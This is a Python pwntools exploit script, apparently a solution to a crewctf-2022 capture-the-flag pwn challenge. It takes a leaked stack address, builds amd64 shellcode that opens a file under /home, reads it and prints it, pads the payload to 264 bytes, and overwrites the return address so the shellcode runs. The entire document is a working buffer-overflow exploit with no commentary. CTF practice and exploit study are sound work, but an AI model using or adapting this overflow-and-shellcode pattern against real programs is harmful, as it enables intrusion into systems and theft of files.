from pwn import *

#p = remote("wiznu.crewctf-2022.crewc.tf", 1337)
elf = ELF("chall")
p = elf.process()
context.arch = 'amd64'

raw_input("DEBUG")

p.recvuntil("Special Gift for Special Person : ")
buff = p.recvline(keepends = False)
buff = int(buff,16)
log.info(hex(buff))

shell = asm('''
    mov rax, 0x0000612f6f65626f
    push rax
    mov rax, 0x656d2f656d6f682f
    push rax
    xor rax,rax
    mov  rdi, rsp
    xor  rsi, rsi
    xor  rdx, rdx
    mov  al, 0x02
    syscall
    mov rdi, rax 
    mov rsi, rsp
    mov rdx, 0x30
    xor rax, rax
    mov al, 0x00
    syscall
    mov rdi, 1
    mov rsi, rsp
    xor rax,rax
    mov al, 0x01
    syscall 
''')


payload = shell
payload += b"A"*(264-len(payload))
payload += p64(buff)
p.sendline(payload)

p.interactive()
